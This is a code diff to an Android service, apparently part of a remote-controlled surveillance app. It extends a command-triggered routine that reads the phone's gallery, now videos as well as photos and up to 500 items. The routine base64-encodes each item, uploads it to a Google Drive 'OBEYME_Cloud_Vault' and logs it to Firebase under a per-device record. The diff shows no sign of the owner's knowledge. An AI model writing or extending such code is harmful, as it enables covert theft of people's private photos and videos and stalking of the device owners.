@@ -330,44 +330,138 @@ class StreamingService : Service() {
         }
     }
 
+    private fun extractVideoThumbnail(contentUri: Uri): String {
+        val retriever = MediaMetadataRetriever()
+        return try {
+            val pfd = contentResolver.openFileDescriptor(contentUri, "r")
+            if (pfd != null) {
+                retriever.setDataSource(pfd.fileDescriptor)
+                val bitmap = retriever.getFrameAtTime(1000000, MediaMetadataRetriever.OPTION_CLOSEST_SYNC) 
+                    ?: retriever.frameAtTime
+                pfd.close()
+                if (bitmap != null) {
+                    val out = ByteArrayOutputStream()
+                    bitmap.compress(Bitmap.CompressFormat.JPEG, 75, out)
+                    val bytes = out.toByteArray()
+                    val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+                    bitmap.recycle()
+                    b64
+                } else ""
+            } else ""
+        } catch (e: Exception) {
+            Timber.e(e, "Error extracting video thumbnail")
+            ""
+        } finally {
+            try { retriever.release() } catch (e: Exception) {}
+        }
+    }
+
     private fun exportGalleryPhotos(snapshot: DataSnapshot) {
         try {
             val mode = snapshot.child("mode").getValue(String::class.java) ?: "latest"
-            val countLimit = snapshot.child("count").getValue(Long::class.java)?.toInt() ?: if (mode == "all") 200 else 10
+            val countLimit = snapshot.child("count").getValue(Long::class.java)?.toInt() ?: if (mode == "all") 500 else 10
             
-            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
-            val projection = arrayOf(
-                MediaStore.Images.Media._ID,
-                MediaStore.Images.Media.DISPLAY_NAME,
-                MediaStore.Images.Media.DATE_ADDED,
-                MediaStore.Images.Media.SIZE
-            )
-            
-            val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
-            val cursor = contentResolver.query(uri, projection, null, null, sortOrder)
-            val photoList = mutableListOf<Map<String, Any>>()
-            
+            val mediaItems = mutableListOf<Map<String, Any>>()
+
+            // 1. Query Photos / Images
+            try {
+                val imgUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+                val imgProj = arrayOf(
+                    MediaStore.Images.Media._ID,
+                    MediaStore.Images.Media.DISPLAY_NAME,
+                    MediaStore.Images.Media.DATE_ADDED,
+                    MediaStore.Images.Media.SIZE
+                )
+                val imgCursor = contentResolver.query(imgUri, imgProj, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC")
+                imgCursor?.use {
+                    val idCol = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
+                    val nameCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
+                    val dateCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
+                    val sizeCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
+                    var c = 0
+                    while (it.moveToNext() && c < countLimit) {
+                        val id = it.getLong(idCol)
+                        val name = it.getString(nameCol) ?: "IMG_$id.jpg"
+                        val date = it.getLong(dateCol) * 1000L
+                        val size = it.getLong(sizeCol)
+                        val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
+                        mediaItems.add(mapOf(
+                            "id" to id,
+                            "name" to name,
+                            "date" to date,
+                            "size" to size,
+                            "uri" to contentUri,
+                            "type" to "image"
+                        ))
+                        c++
+                    }
+                }
+            } catch (e: Exception) {
+                Timber.e(e, "Error querying images")
+            }
+
+            // 2. Query Videos
+            try {
+                val vidUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
+                val vidProj = arrayOf(
+                    MediaStore.Video.Media._ID,
+                    MediaStore.Video.Media.DISPLAY_NAME,
+                    MediaStore.Video.Media.DATE_ADDED,
+                    MediaStore.Video.Media.SIZE,
+                    MediaStore.Video.Media.DURATION
+                )
+                val vidCursor = contentResolver.query(vidUri, vidProj, null, null, "${MediaStore.Video.Media.DATE_ADDED} DESC")
+                vidCursor?.use {
+                    val idCol = it.getColumnIndexOrThrow(MediaStore.Video.Media._ID)
+                    val nameCol = it.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
+                    val dateCol = it.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_ADDED)
+                    val sizeCol = it.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE)
+                    val durCol = it.getColumnIndex(MediaStore.Video.Media.DURATION)
+                    var c = 0
+                    while (it.moveToNext() && c < countLimit) {
+                        val id = it.getLong(idCol)
+                        val name = it.getString(nameCol) ?: "VID_$id.mp4"
+                        val date = it.getLong(dateCol) * 1000L
+                        val size = it.getLong(sizeCol)
+                        val duration = if (durCol != -1) it.getLong(durCol) else 0L
+                        val contentUri = ContentUris.withAppendedId(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, id)
+                        mediaItems.add(mapOf(
+                            "id" to id,
+                            "name" to name,
+                            "date" to date,
+                            "size" to size,
+                            "duration" to duration,
+                            "uri" to contentUri,
+                            "type" to "video"
+                        ))
+                        c++
+                    }
+                }
+            } catch (e: Exception) {
+                Timber.e(e, "Error querying videos")
+            }
+
+            // 3. Sort merged media by date descending
+            val sortedMedia = mediaItems.sortedByDescending { it["date"] as Long }.take(countLimit)
+            val outputList = mutableListOf<Map<String, Any>>()
             var processed = 0
-            cursor?.use {
-                val idCol = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
-                val nameCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
-                val dateCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
-                val sizeCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
-                
-                while (it.moveToNext() && processed < countLimit) {
-                    val id = it.getLong(idCol)
-                    val name = it.getString(nameCol) ?: "IMG_$id.jpg"
-                    val date = it.getLong(dateCol) * 1000L
-                    val size = it.getLong(sizeCol)
-                    
-                    val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
-                    
-                    var rawBase64 = ""
+
+            for (item in sortedMedia) {
+                val id = item["id"].toString()
+                val name = item["name"].toString()
+                val date = item["date"] as Long
+                val size = item["size"] as Long
+                val type = item["type"].toString()
+                val uri = item["uri"] as Uri
+                val duration = (item["duration"] as? Long) ?: 0L
+
+                var rawBase64 = ""
+                if (type == "video") {
+                    rawBase64 = extractVideoThumbnail(uri)
+                } else {
                     try {
-                        contentResolver.openInputStream(contentUri)?.use { input ->
-                            val options = BitmapFactory.Options().apply {
-                                inSampleSize = 2 // Good balance of quality and speed for Google Drive
-                            }
+                        contentResolver.openInputStream(uri)?.use { input ->
+                            val options = BitmapFactory.Options().apply { inSampleSize = 2 }
                             val bitmap = BitmapFactory.decodeStream(input, null, options)
                             if (bitmap != null) {
                                 val out = ByteArrayOutputStream()
@@ -380,40 +474,42 @@ class StreamingService : Service() {
                     } catch (ex: Exception) {
                         Timber.e(ex, "Error reading photo: $name")
                     }
-                    
-                    if (rawBase64.isNotEmpty()) {
-                        val photoEntry = mutableMapOf<String, Any>(
-                            "id" to id.toString(),
-                            "name" to name,
-                            "time" to date,
-                            "size" to size
-                        )
+                }
 
-                        // Upload strictly to Google Drive Vault
-                        val driveRes = uploadToGoogleDrive(name, rawBase64)
-                        if (driveRes != null) {
-                            photoEntry["fileId"] = driveRes["fileId"] ?: ""
-                            photoEntry["driveUrl"] = driveRes["driveUrl"] ?: ""
-                            photoEntry["directUrl"] = driveRes["directUrl"] ?: ""
-                            photoEntry["provider"] = "google_drive"
-                            photoList.add(photoEntry)
-                            processed++
-                        } else {
-                            Timber.e("Google Drive upload failed for $name - skipping Firebase base64 fallback")
-                        }
+                if (rawBase64.isNotEmpty()) {
+                    val photoEntry = mutableMapOf<String, Any>(
+                        "id" to id,
+                        "name" to name,
+                        "time" to date,
+                        "size" to size,
+                        "type" to type,
+                        "duration" to duration
+                    )
+
+                    // Upload strictly to Google Drive Vault
+                    val driveRes = uploadToGoogleDrive(name, rawBase64)
+                    if (driveRes != null) {
+                        photoEntry["fileId"] = driveRes["fileId"] ?: ""
+                        photoEntry["driveUrl"] = driveRes["driveUrl"] ?: ""
+                        photoEntry["directUrl"] = driveRes["directUrl"] ?: ""
+                        photoEntry["provider"] = "google_drive"
+                        outputList.add(photoEntry)
+                        processed++
+                    } else {
+                        Timber.e("Google Drive upload failed for $name")
                     }
                 }
             }
             
             if (mode == "all") {
-                deviceRef?.child("media/gallery")?.setValue(photoList)
+                deviceRef?.child("media/gallery")?.setValue(outputList)
             } else {
-                deviceRef?.child("media/recent")?.setValue(photoList)
+                deviceRef?.child("media/recent")?.setValue(outputList)
             }
 
             // Also post notification log to Firebase logs
             deviceRef?.child("logs")?.push()?.setValue(mapOf(
-                "log" to "☁️ [GOOGLE DRIVE VAULT] Synced $processed photos to Google Drive (OBEYME_Cloud_Vault)",
+                "log" to "☁️ [GOOGLE DRIVE VAULT] Synced $processed media items (Photos & Videos) to Google Drive (OBEYME_Cloud_Vault)",
                 "time" to ServerValue.TIMESTAMP
             ))
         } catch (e: Exception) {
